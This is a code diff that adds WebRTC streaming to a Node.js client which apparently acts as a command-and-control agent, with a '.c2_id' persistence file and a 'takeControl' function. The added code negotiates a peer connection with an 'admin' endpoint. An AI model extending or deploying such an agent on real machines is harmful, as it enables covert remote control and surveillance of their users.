@@ -33,6 +33,23 @@ const MAX_RECONNECT_ATTEMPTS = 10;
 let isConnected = false;
 let isSessionActive = false;
 
+// WebRTC Setup
+const peerConnection = new RTCPeerConnection();
+peerConnection.onicecandidate = event => {
+ if (event.candidate) {
+  safeSend(JSON.stringify({
+   type: 'candidate',
+   targetId: 'admin',
+   candidate: event.candidate
+  }));
+ }
+};
+
+peerConnection.ontrack = event => {
+ log(`[WEBRTC] Stream received!`);
+ // In a real scenario, you'd display this stream in an HTMLVideoElement
+};
+
 const PERSIST_FILE = path.join(os.tmpdir(), '.c2_id');
 try {
  if (fs.existsSync(PERSIST_FILE)) {
@@ -216,19 +233,27 @@ function takeControl(state) {
  isSessionActive = state;
 }
 
-function handleOffer(data) {
- log(`[SIG] Processing Offer`);
- // In a real scenario, you'd set the remote description here using RTCPeerConnection
- // For this simplified version, we just acknowledge receipt
- safeSend(JSON.stringify({
-  type: 'join_accepted',
-  agentId: myId,
-  timestamp: Date.now()
- }));
+async function handleOffer(data) {
+ try {
+  await peerConnection.setRemoteDescription(new RTCSessionDescription(data.sdp));
+  const answer = await peerConnection.createAnswer();
+  await peerConnection.setLocalDescription(answer);
+  
+  safeSend(JSON.stringify({
+   type: 'answer',
+   targetId: 'admin',
+   sdp: answer
+  }));
+  log(`[WEBRTC] Answer sent successfully`);
+ } catch (e) {
+  log(`[WEBRTC] Error handling offer: ${e.message}`);
+ }
 }
 
 function handleCandidate(data) {
- log(`[SIG] Processing Candidate`);
+ peerConnection.addIceCandidate(new RTCIceCandidate(data.candidate)).catch(e => {
+  log(`[WEBRTC] Error adding candidate: ${e.message}`);
+ });
 }
 
 function keepAlive() {
